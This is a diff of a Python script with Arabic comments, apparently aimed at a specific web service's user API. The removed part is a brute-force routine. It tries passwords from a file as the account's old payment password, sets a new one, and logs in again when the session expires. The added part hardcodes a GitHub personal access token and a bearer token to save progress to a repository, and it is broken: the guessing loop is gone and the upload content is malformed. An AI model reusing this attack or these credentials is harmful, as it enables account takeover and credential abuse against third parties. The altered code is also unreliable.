@@ -1,6 +1,5 @@
 import requests
-import threading
-import time
+import json
 
 # بيانات تسجيل الدخول
 login_data = {
@@ -9,9 +8,16 @@ login_data = {
     'lang': 'eg',
 }
 
-# متغيرات التقدم
-progress = 0  # عدد كلمات المرور المجربة
+# المتغيرات
+progress = 0  # تقدم المحاولات
 is_running = True  # حالة المحاولة
+
+# التوكن الخاص بجيتهاب
+github_token = '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'
+repo_owner = 'your-github-username'
+repo_name = 'your-repo-name'
+file_path = 'progress.txt'  # الملف الذي يحتوي على التقدم
+branch = 'main'
 
 # التوكن المستخدم في الطلبات
 token = "02c8znoKfqx8sfRg0C0p1mQ64VVuoa7vMu+wgn1rttGH04eVulqXpX0SM9mF"
@@ -23,80 +29,46 @@ headers = {
     'Authorization': f'Bearer {token}',
 }
 
-# قراءة كلمات المرور من ملف
-def load_passwords(file_path):
-    try:
-        with open(file_path, 'r') as file:
-            passwords = file.read().splitlines()
-            print(f"✅ تم تحميل {len(passwords)} كلمة مرور من {file_path}")
-        return passwords
-    except FileNotFoundError:
-        print(f"⚠️ الملف {file_path} غير موجود.")
-        return []
+# قراءة التقدم من GitHub
+def read_progress_from_github():
+    global progress
+    url = f'https://api.github.com/repos/{repo_owner}/{repo_name}/contents/{file_path}'
+    response = requests.get(url, headers={'Authorization': f'token {github_token}'})
+    
+    if response.status_code == 200:
+        file_content = response.json()
+        file_data = requests.get(file_content['download_url']).text
+        progress = int(file_data.strip())  # تحويل النص إلى رقم
+        print(f"✅ تم استرجاع التقدم الحالي من GitHub: {progress}")
+    else:
+        print("⚠️ لم يتم العثور على الملف أو فشل الاتصال بـ GitHub.")
 
-# دالة تجربة كلمات المرور
-def try_passwords(passwords):
-    global progress, is_running, token, headers
-
-    if not passwords:
-        print("⚠️ لا توجد كلمات مرور للتجربة.")
-        return
-
-    while is_running and progress < len(passwords):
-        password = passwords[progress]  # كلمة المرور التالية من الملف
-        print(f"🔑 تجربة كلمة المرور رقم {progress + 1}: {password}")
-        data = {
-            'o_payword': password,
-            'n_payword': '123123',
-            'r_payword': '123123',
-            'lang': 'eg',
-            'token': token,
+# تحديث التقدم في GitHub
+def update_progress_on_github():
+    global progress
+    url = f'https://api.github.com/repos/{repo_owner}/{repo_name}/contents/{file_path}'
+    response = requests.get(url, headers={'Authorization': f'token {github_token}'})
+    
+    if response.status_code == 200:
+        file_info = response.json()
+        sha = file_info['sha']
+        update_content = {
+            "message": "Updating progress",
+            "content": json.dumps(str(progress)).encode('utf-8').decode('utf-8'),
+            "sha": sha,
+            "branch": branch
         }
-        url = "https://btsmoa.btswork.vip/api/user/setuserinfo"
-        try:
-            response = requests.post(url, json=data, headers=headers)
-            response_json = response.json()
-
-            # التحقق من نتيجة الطلب
-            if response_json.get("code") == 200:
-                print(f"✅ تم تغيير كلمة المرور بنجاح باستخدام: {password}")
-                progress += 1  # تحديث التقدم عند النجاح
-            elif response_json.get("code") in [203, 204]:
-                print("🔄 انتهت الجلسة، إعادة تسجيل الدخول...")
-                relogin()  # إعادة تسجيل الدخول والحصول على توكن جديد
-            else:
-                print(f"⚠️ فشل تغيير كلمة المرور. الرد: {response_json}")
-                progress += 1  # التقدم عند الفشل لتجنب تكرار نفس المحاولة
-
-        except requests.exceptions.RequestException as e:
-            print(f"⚠️ خطأ أثناء إرسال الطلب: {e}")
-            time.sleep(5)
-
-# دالة إعادة تسجيل الدخول
-def relogin():
-    global token, headers
-    print("🔄 إعادة تسجيل الدخول للحصول على توكن جديد...")
-    try:
-        response = requests.post('https://btsmoa.btswork.vip/api/User/Login', json=login_data)
-        if response.status_code == 200:
-            result = response.json()
-            if "info" in result and "token" in result["info"]:
-                token = result["info"]["token"]
-                headers['Authorization'] = f'Bearer {token}'  # تحديث التوكن في الهيدر
-                print(f"✅ تم الحصول على التوكن الجديد: {token}")
+        update_response = requests.put(url, headers={'Authorization': f'token {github_token}'}, json=update_content)
+        if update_response.status_code == 200:
+            print(f"✅ تم تحديث التقدم إلى: {progress}")
         else:
-            print(f"⚠️ فشل تسجيل الدخول. الرد: {response.json()}")
-    except requests.exceptions.RequestException as e:
-        print(f"⚠️ خطأ أثناء تسجيل الدخول: {e}")
-        time.sleep(5)
+            print(f"⚠️ حدث خطأ أثناء تحديث التقدم: {update_response.content}")
+    else:
+        print("⚠️ لم يتم العثور على الملف لتحديثه.")
 
-# تحميل كلمات المرور من الملف
-passwords = load_passwords('passwordss.txt')
+# هنا تقوم باستدعاء `read_progress_from_github` في بداية الكود لاسترجاع التقدم من GitHub
+read_progress_from_github()
 
-# بدء تجربة كلمات المرور في Thread منفصل
-if passwords:
-    threading.Thread(target=try_passwords, args=(passwords,), daemon=True).start()
-    while progress < len(passwords):
-        time.sleep(1)  # منع انتهاء البرنامج قبل اكتمال التجربة
-else:
-    print("⚠️ لم يتم العثور على كلمات مرور لتجربتها.")
+# وفي كل مرة يتغير التقدم (بعد كل محاولة ناجحة أو فاشلة) تقوم باستدعاء `update_progress_on_github` لحفظ التقدم
+progress += 1  # عند نجاح أو فشل المحاولة
+update_progress_on_github()
